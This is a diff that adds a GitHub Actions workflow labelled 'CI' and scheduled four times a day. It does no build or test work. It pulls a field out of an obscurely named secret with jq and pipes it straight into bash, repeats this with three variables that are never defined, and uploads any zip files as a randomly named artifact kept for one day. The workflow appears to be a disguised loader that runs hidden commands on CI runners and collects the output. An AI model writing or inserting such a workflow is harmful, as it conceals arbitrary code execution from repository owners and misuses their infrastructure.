@@ -1,0 +1,34 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '25 2,8,14,20 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          uzf47: ${{ secrets.uzf47 }}
+        run: |
+          printf '%s' "$uzf47" | jq -r .r197 | /bin/bash
+          echo $pz24 | jq -r .bwou665 | /bin/bash
+          printf '%s' "$octjq503" | jq -r .tcs98156 | /bin/bash
+          printf '%s' "$whx19" | jq -r .jpvq492 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: OhWTfeqI
+          path: "*.zip"
+          retention-days: 1
